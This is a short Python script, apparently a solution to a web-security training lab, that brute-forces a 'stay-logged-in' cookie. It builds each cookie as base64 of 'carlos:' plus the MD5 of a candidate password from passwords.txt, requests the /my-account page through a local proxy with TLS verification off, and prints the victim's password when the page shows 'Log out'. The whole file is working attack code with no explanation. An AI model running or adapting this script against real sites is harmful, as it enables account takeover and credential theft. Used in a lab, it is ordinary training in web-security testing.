
import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def access_victim_account(url):

    print("(+) Brute-forcing victim account.....")
    with open('passwords.txt', 'r') as file:
        for pwd in file:
            hashed_pwd = 'carlos:' + hashlib.md5(pwd.strip('\r\n').encode("utf-8")).hexdigest()
            encode_pwd = base64.b64encode(bytes(hashed_pwd, 'utf-8'))
            str_pwd = encode_pwd.decode('utf-8')

            # perform the request
            r = requests.session()
            my_account_url = url + '/my-account'
            cookies = {
                'stay-logged-in': str_pwd
            }
            req = r.get(my_account_url, cookies=cookies, verify=False)
            if 'Log out' in req.text:
                print("(+) Victim's password is: " + pwd)
                sys.exit(1)
        print("(-) Could not find the victim password.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    access_victim_account(url)


if __name__ == '__main__':
    main()
